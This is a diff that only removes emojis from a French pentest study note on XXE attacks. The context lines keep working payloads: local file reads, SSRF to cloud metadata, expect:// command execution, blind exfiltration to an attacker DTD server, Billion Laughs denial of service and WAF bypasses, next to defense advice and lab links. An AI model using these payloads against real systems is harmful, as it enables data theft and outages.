@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 📄 XXE — XML External Entity
+# XXE — XML External Entity
 
 > [!info] **En 1 phrase**
 > XXE = abuser du **DOCTYPE/entités XML** d'un parseur pour lui faire lire des **fichiers locaux**,
@@ -22,7 +22,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -35,14 +35,14 @@ flowchart LR
     E --> H[serveur attaquant<br/>Burp Collaborator / Interactsh]
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > Beaucoup d'apps (API SOAP, upload de fichiers, parsers DOCX/SVG, config XML…) traitent du XML avec
 > **DTD et entités externes activées par défaut** (`libxml`, `DocumentBuilder`, certaines libs .NET/Python).
 > Le parseur va **chercher et résoudre** toute ressource `SYSTEM`. Un parseur **JSON** n'exécute pas de DTD → la vulnérabilité disparaît.
 
 ---
 
-## 📚 Rappels XML — DOCTYPE & ENTITY
+## Rappels XML — DOCTYPE & ENTITY
 
 Le `DOCTYPE` se déclare **avant la racine** du document ; les entités se définissent dedans.
 
@@ -52,7 +52,7 @@ Le `DOCTYPE` se déclare **avant la racine** du document ; les entités se défi
 | **Externe** | `<!ENTITY name SYSTEM "URI">` | contenu du document (`&name;`) |
 | **Paramètre** | `<!ENTITY % name "valeur">` ou `SYSTEM "URI"` | **uniquement dans la DTD** (`%name;`) |
 
-> [!tip] 💡 **Test de base** — si `<lastName>` contient `Doe` dans la réponse, les entités sont **traitées** → XXE potentiel.
+> [!tip] **Test de base** — si `<lastName>` contient `Doe` dans la réponse, les entités sont **traitées** → XXE potentiel.
 
 ```xml
 <?xml version="1.0" ?>
@@ -63,11 +63,11 @@ Le `DOCTYPE` se déclare **avant la racine** du document ; les entités se défi
 </userInfo>
 ```
 
-> [!warning] ⚠️ `SYSTEM` et `PUBLIC` sont presque synonymes : `<!ENTITY x PUBLIC "Any TEXT" "URL">` fonctionne aussi. Définir `<!ELEMENT foo ANY>` est optionnel mais évite les erreurs de validation.
+> [!warning] `SYSTEM` et `PUBLIC` sont presque synonymes : `<!ENTITY x PUBLIC "Any TEXT" "URL">` fonctionne aussi. Définir `<!ELEMENT foo ANY>` est optionnel mais évite les erreurs de validation.
 
 ---
 
-## 🕵️ Détection
+## Détection
 
 1. **Repérer du XML** : `Content-Type: application/xml`/`text/xml` ; endpoints SOAP ; erreurs `SAXParseException`/`org.xml.sax...` ; uploads `.xml`, `.svg`, `.docx`, `.xlsx`, `.pdf` (probablement parsés en XML).
 2. **Confirmer le parsing** (entité interne) — si la réponse contient `XXXXEDET`, les entités sont résolues :
@@ -96,7 +96,7 @@ Le `DOCTYPE` se déclare **avant la racine** du document ; les entités se défi
 <r></r>
 ```
 
-> [!tip] 💡 **XML vs JSON** : si l'app parse du JSON, forcer le `Content-Type` en `application/xml` (certaines libs — Jackson XML, .NET — acceptent les deux formats) et adapter la structure du body :
+> [!tip] **XML vs JSON** : si l'app parse du JSON, forcer le `Content-Type` en `application/xml` (certaines libs — Jackson XML, .NET — acceptent les deux formats) et adapter la structure du body :
 
 ```http
 POST /search HTTP/1.1
@@ -109,7 +109,7 @@ Content-Type: application/xml
 
 ---
 
-## 📂 Lecture de fichiers
+## Lecture de fichiers
 
 ```xml
 <!-- Linux -->
@@ -139,11 +139,11 @@ Content-Type: application/xml
 
 **Protocole `data://`** : `<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>`
 
-> [!warning] ⚠️ Les fichiers **binaires** et ceux contenant `&`/`<` ne passent pas in-band : utiliser `php://filter/convert.base64-encode` ou l'exfiltration **FTP** (plus fiable que HTTP pour les gros fichiers).
+> [!warning] Les fichiers **binaires** et ceux contenant `&`/`<` ne passent pas in-band : utiliser `php://filter/convert.base64-encode` ou l'exfiltration **FTP** (plus fiable que HTTP pour les gros fichiers).
 
 ---
 
-## 🌐 XXE → SSRF
+## XXE → SSRF
 
 L'entité externe pointe vers une **URL interne** → le serveur joue le rôle de client HTTP.
 
@@ -165,11 +165,11 @@ L'entité externe pointe vers une **URL interne** → le serveur joue le rôle d
 
 **Scan réseau interne (port)** : `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://10.0.0.1:8080/">]><foo>&xxe;</foo>`
 
-> [!tip] 💡 **Méthodo** : ① tester `http://169.254.169.254/` (cloud), `http://127.0.0.1:PORT/` (services locaux) puis la plage interne ; ② comparer **réponses/erreurs** (contenu ≠ pour port ouvert vs fermé, timeout, statut) ; ③ combo XXE→SSRF : relayer vers des services authentifiés. Vecteur détaillé : [[SSRF|🌐 SSRF]].
+> [!tip] **Méthodo** : ① tester `http://169.254.169.254/` (cloud), `http://127.0.0.1:PORT/` (services locaux) puis la plage interne ; ② comparer **réponses/erreurs** (contenu ≠ pour port ouvert vs fermé, timeout, statut) ; ③ combo XXE→SSRF : relayer vers des services authentifiés. Vecteur détaillé : [[SSRF| SSRF]].
 
 ---
 
-## 💥 XXE → RCE
+## XXE → RCE
 
 - **`expect://` (PHP + extension expect)** : `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>`
 - **SVG avec `expect`** :
@@ -186,7 +186,7 @@ L'entité externe pointe vers une **URL interne** → le serveur joue le rôle d
 
 ---
 
-## 🙈 Blind XXE (OOB)
+## Blind XXE (OOB)
 
 > **Blind = pas de retour dans la réponse.** On exfiltre par **requêtes sortantes** vers un serveur contrôlé.
 > Il faut un **DTD externe** : une DTD **interne** ne permet pas de référencer `%file;` dans la définition d'une autre entité paramètre (concaténation impossible).
@@ -221,7 +221,7 @@ L'entité externe pointe vers une **URL interne** → le serveur joue le rôle d
 %all;
 ```
 
-> [!tip] 💡 **Pourquoi le DTD externe en 2 étapes ?** ① le payload charge `%all;` depuis notre serveur, ② `%all;` définit `send` qui requête `/?contenu_fichier`, ③ notre serveur reçoit le contenu dans l'URL. On **change juste le DTD** pour changer de fichier, sans reconstruire le payload.
+> [!tip] **Pourquoi le DTD externe en 2 étapes ?** ① le payload charge `%all;` depuis notre serveur, ② `%all;` définit `send` qui requête `/?contenu_fichier`, ③ notre serveur reçoit le contenu dans l'URL. On **change juste le DTD** pour changer de fichier, sans reconstruire le payload.
 
 ### 3. Variante PHP filter (base64, évite les caractères interdits dans l'URL)
 
@@ -251,7 +251,7 @@ L'entité externe pointe vers une **URL interne** → le serveur joue le rôle d
 <!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://ATTACKER:2121/%d;'>">
 ```
 
-> [!warning] ⚠️ Sur la plupart des parsers, seul le **premier flux** FTP est émis → souvent la **1ʳᵉ ligne**. Répéter l'extraction morceau par morceau (offset selon la lib) ou passer par `php://filter` + base64.
+> [!warning] Sur la plupart des parsers, seul le **premier flux** FTP est émis → souvent la **1ʳᵉ ligne**. Répéter l'extraction morceau par morceau (offset selon la lib) ou passer par `php://filter` + base64.
 
 ### 5. Error-based (retour dans le message d'erreur)
 
@@ -277,7 +277,7 @@ L'entité externe pointe vers une **URL interne** → le serveur joue le rôle d
 %error;
 ```
 
-> [!info] 💡 **Déroulé** — `%file;` = contenu du fichier → `%eval;` définit `error` qui référence un fichier **inexistant** (`file:///nonexistent/<passwd>`) → erreur `File not found` avec le **chemin** affiché = fichier divulgué. `&#x25;` = `%` échappé dans la définition d'entité.
+> [!info] **Déroulé** — `%file;` = contenu du fichier → `%eval;` définit `error` qui référence un fichier **inexistant** (`file:///nonexistent/<passwd>`) → erreur `File not found` avec le **chemin** affiché = fichier divulgué. `&#x25;` = `%` échappé dans la définition d'entité.
 
 ### 6. Error-based avec DTD locale (fetch sortants bloqués)
 
@@ -326,9 +326,9 @@ L'entité externe pointe vers une **URL interne** → le serveur joue le rôle d
 
 ---
 
-## 💣 Denial of Service (Billion Laughs)
+## Denial of Service (Billion Laughs)
 
-> [!warning] ⚠️ **Jamais en prod** : expansion exponentielle qui peut tuer le service / le serveur.
+> [!warning] **Jamais en prod** : expansion exponentielle qui peut tuer le service / le serveur.
 
 ```xml
 <!DOCTYPE data [
@@ -345,7 +345,7 @@ L'entité externe pointe vers une **URL interne** → le serveur joue le rôle d
 
 ---
 
-## 🗂️ XXE dans les fichiers exotiques
+## XXE dans les fichiers exotiques
 
 ### SVG (upload d'image)
 
@@ -388,10 +388,10 @@ Structure à cibler : `[Content_Types].xml`, `_rels/.rels`, `/word/document.xml`
 ```bash
 unzip xxe.docx -d XXE          # extraire
 # ... injecter le payload dans word/document.xml ...
-cd XXE && zip -r -u ../xxe.docx *   # rezipper (⚠️ zip -u, PAS 7z)
+cd XXE && zip -r -u ../xxe.docx *   # rezipper (zip -u, PAS 7z)
 ```
 
-> [!warning] ⚠️ Utiliser `zip -u` (Info-ZIP), **pas** `7z u`/`7za u` : la recompression 7z casse la signature et les parseurs Excel/Office refusent le fichier. Vérifier : `file xxe.xlsx` → `Microsoft Excel 2007+`.
+> [!warning] Utiliser `zip -u` (Info-ZIP), **pas** `7z u`/`7za u` : la recompression 7z casse la signature et les parseurs Excel/Office refusent le fichier. Vérifier : `file xxe.xlsx` → `Microsoft Excel 2007+`.
 
 **XLSX — payload dans `xl/workbook.xml` :** (variante équivalente : `xl/sharedStrings.xml`)
 
@@ -402,7 +402,7 @@ cd XXE && zip -r -u ../xxe.docx *   # rezipper (⚠️ zip -u, PAS 7z)
 <workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
 ```
 
-> [!tip] 💡 Le **DTD externe** évite de reconstruire le doc à chaque fichier cible : on construit le doc **une fois**, puis on change le `xxe.dtd`. **FTP** au lieu de HTTP = fichiers plus gros récupérables.
+> [!tip] Le **DTD externe** évite de reconstruire le doc à chaque fichier cible : on construit le doc **une fois**, puis on change le `xxe.dtd`. **FTP** au lieu de HTTP = fichiers plus gros récupérables.
 
 ### SOAP (le DOCTYPE peut passer dans un CDATA)
 
@@ -421,11 +421,11 @@ cd XXE && zip -r -u ../xxe.docx *   # rezipper (⚠️ zip -u, PAS 7z)
 - **PDF** : possible (via `oxml_xxe`, expérimental) — le PDF contient du XML interne.
 - **Config XML** : fichiers de config, parsers de licences, `.dtd`, `.plist`…
 
-> 📦 **oxml_xxe** (BuffaloWill) et **docem** (whitel1st) automatisent l'injection dans DOCX/XLSX/PPTX/ODT/ODG/ODP/ODS/SVG/XML/PDF/JPG/GIF.
+> **oxml_xxe** (BuffaloWill) et **docem** (whitel1st) automatisent l'injection dans DOCX/XLSX/PPTX/ODT/ODG/ODP/ODS/SVG/XML/PDF/JPG/GIF.
 
 ---
 
-## 🧱 Bypass WAF / filtres
+## Bypass WAF / filtres
 
 - **Blocage du DOCTYPE** : les entités paramètres déclenchent un fetch sans DOCTYPE visible dans le corps final — `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % a SYSTEM "http://ATTACKER/">%a;]><r/>`.
 - **Casse / normalisation** : XML strict = sensible à la casse, mais certains parseurs permissifs acceptent `<!doctype`, `<!Doctype…>`, `<!ENTITY`, `<!DOCTYPE SYSTEM>` sans URL, espaces multiples, `SYSTEM` en minuscules. Nouvelles lignes/espaces insérés : `<!DOCTYPE\nroot\n[\n<!ENTITY x SYSTEM "file:///etc/passwd">\n]>\n<root>&x;</root>`.
@@ -448,7 +448,7 @@ cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
 
 ---
 
-## 🛡️ Défense
+## Défense
 
 > Règle d'or : **désactiver les entités externes et la résolution de DTD** dans le parseur, ou **ne pas parser de XML** (préférer JSON).
 
@@ -481,7 +481,7 @@ from defusedxml import minidom   # Python : defusedxml = bibliothèque de réfé
 
 ---
 
-## 🧰 Outils
+## Outils
 
 | Outil | Usage |
 |---|---|
@@ -502,7 +502,7 @@ python3 -m http.server 8000                            # simple serveur pour evi
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -517,20 +517,20 @@ python3 -m http.server 8000                            # simple serveur pour evi
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Ordre logique d'attaque**
+> [!tip] **Ordre logique d'attaque**
 > 1. Confirmer le parsing XML (entité interne `Doe`).
 > 2. In-band `file:///etc/passwd` → si rien, **Blind** : ping OAST.
 > 3. Blind → DTD externe + FTP/HTTP pour exfiltrer, ou **error-based** si les erreurs sont visibles.
 > 4. Pas de contrôle du DOCTYPE → **XInclude**.
 > 5. Upgrade : SSRF interne / cloud metadata → RCE (`expect://`, XSLT) → pivot.
 
-> [!warning] ⚠️ **In-band vs OOB**
+> [!warning] **In-band vs OOB**
 > - **In-band** : le contenu revient dans la réponse XML de l'app (simple, fichiers lisibles uniquement).
 > - **OOB/Blind** : rien ne revient, on exfiltre par un canal sortant (HTTP/FTP/DNS) — quasiment toujours via **entités paramètres** + **DTD externe**. Une DTD **interne** ne permet pas de chaîner `%file;` dans une autre entité.
 
-> [!warning] ⚠️ **Pièges classiques**
+> [!warning] **Pièges classiques**
 > - `expect://` et `php://` ne marchent que sur PHP ; `file:///C:/...` pour Windows (pas `file://C:\...`).
 > - Les fichiers avec `&`, `<`, retours à la ligne cassent l'in-band → **base64** (`php://filter`) ou **FTP**.
 > - FTP : souvent **1ʳᵉ ligne seulement** → découper le fichier ou répéter l'extraction.
@@ -540,13 +540,13 @@ python3 -m http.server 8000                            # simple serveur pour evi
 > - Billion Laughs = **service à terre**, jamais en prod/CTF partagé.
 > - Ports de réception : **80/8000** (HTTP, DTD + exfil), **2121** (FTP, exfil volumineuse), **53** (DNS OAST).
 
-> [!tip] 💡 **DTD en 2 étapes (résumé)**
+> [!tip] **DTD en 2 étapes (résumé)**
 > 1ʳᵉ étape : le payload cible charge `SYSTEM "http://ATTAQUANT/evil.dtd"` et déclenche `%ext;`.
 > 2ᵉ étape : `evil.dtd` définit `%file;` → `%all;`/`%param1;` → `%exfil;` qui requête notre serveur avec le contenu dans l'URL. Changer de fichier = **éditer le DTD**, pas le payload.
 
 ---
 
-## 🧪 Labs
+## Labs
 
 - PortSwigger Web Security Academy — XXE : https://portswigger.net/web-security/xxe
   - Retrieve files : `lab-exploiting-xxe-to-retrieve-files` · SSRF : `lab-exploiting-xxe-to-perform-ssrf` · XInclude : `lab-xinclude-attack` · Image upload : `lab-xxe-via-file-upload`
@@ -557,12 +557,12 @@ python3 -m http.server 8000                            # simple serveur pour evi
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[Injection SQL|💾 SQLi]]
-- [[SSRF|🌐 SSRF]]
-- [[LFI et RFI|📂 LFI / RFI]]
-- [[Injection de commandes|🐚 Injection de commandes]]
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
-- 🛡️ OWASP : [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+- [[Injection SQL| SQLi]]
+- [[SSRF| SSRF]]
+- [[LFI et RFI| LFI / RFI]]
+- [[Injection de commandes| Injection de commandes]]
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
+- OWASP : [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
